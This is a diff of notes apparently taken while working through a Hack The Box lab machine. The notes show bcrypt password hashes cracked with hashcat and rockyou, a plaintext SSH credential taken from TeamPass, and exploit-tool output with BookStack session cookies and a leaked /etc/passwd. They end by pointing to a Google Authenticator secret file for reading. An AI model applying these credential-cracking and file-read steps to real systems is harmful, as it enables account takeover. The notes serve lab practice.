@@ -70,9 +70,12 @@ admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
 bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
 
 
-
+┌──(kali㉿kali)-[~/Desktop/htb]
+└─$ hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --username
 $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy:cheerleader
 
+
+# in teampass
 ssh-access:hiccup-publicly-genesis
 
 boosktack login: 
@@ -121,6 +124,8 @@ def req_with_response(self, s):
 [*] Additionnal headers used : {"Content-Type":"application/x-www-form-urlencoded", "Cookie":"XSRF-TOKEN=eyJpdiI6Ikk2eWpKNE9qMjFXUHRidFFaWWUvS0E9PSIsInZhbHVlIjoiUFZaVHU1eWIvTW8wdU5LQ01qZzhVcUltb090N0d5aC9heU9maks2cUdQRW53Q2RzVmF3UVkzZGVXVTBrZXhmRCtlQWxmVnArRVhRaE5aYjhCQWRpZjIxMzJXVXRJNXhWdG5JTGVwNmtESzNXYXIwWFRNb1FtU2tCZjM2UDE3NGwiLCJtYWMiOiJmMzBjNmYzZjllYzkyYWQ4ODhlNmYyMWNlNzdhMTAxM2IzZDEwZTFhNGNiMjZiYzM3MGY3MWEwMWY1MWZlNDk5IiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImhUc1p0RzdzVTRuZEo4c3JHUzJiR1E9PSIsInZhbHVlIjoiSjdpZHZkbTB4b2RmQXprbk9CZ2RFZS9RUGZOOC9VMnh4UHowOW03UVNsS1pHQ3VtcHlTNkNYVmJIcWEwaXVSU3BHa1l3S0xSWTNQcTZGVC9kTFoxK2FnRzU0cWpzQm5TbU8zcmF4VmhiU0RVWk1EZUhFOGpxZ3JpVEU1aTlHN00iLCJtYWMiOiIxNWY2YmVmZmU0NzlkMGIxNWY5ZjUzNWE3M2JlM2ZjYzZiOGI3ZDdiNmZiNmI0MjNmY2E5YjQzNTg3YTI4OTFiIiwidGFnIjoiIn0%3D; remember_standard_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6InBRQi80aHZsMkF1QUFLRW9POHJVZ3c9PSIsInZhbHVlIjoiM3lZQTNObU95SDlHRGNVMi9NUWhqYWg0TVdoMnRyVGhsVCtDSUpmL1pjdGltUmpnSmhpd3phOXdsZnBzc3NvN2VhZ3FGWWF1c0lyUlBGY2tzSk5QK3drNjQ3eVlNQy80amhxVzNtUVRLWGlIMU9aVDk0K3U4VkpkMm9ZTlBSQ0Y2TUhkd0ZOTVE2Y1BTalkxTHRLRnkybkZEdmw5bWoyckRhdlppdzI5cU53eGZHQVFqU2dSWk51V1NteGF0MnUrYndXVVFicGpOQ2tMc3luZDByZTYvL3Y1MGQzSzR4enNIZHRNUDhCd3Z1RT0iLCJtYWMiOiI0OTVkYjRiNTk4Y2Q3ZjY3MTAwNGFjNzkyZWFjZGU2NzQ5NmJlNTUyOTExYzNmMzNhYjRlYTYyN2M1M2RhYjBjIiwidGFnIjoiIn0%3D", "X-CSRF-TOKEN":"kpj3PdOH3eghhZLEXoVFjTvnyLyFwabckMABa0IY"}
 cm9vdDp4OjA6MDpyb290Oi9
 b'root:x:0:0:root:/ <SNIP>'
+
+# we found a script in bookstack takling about back, check out backup
 
 
 read the file: /backup/home_backup/home/reader/.google_authenticator
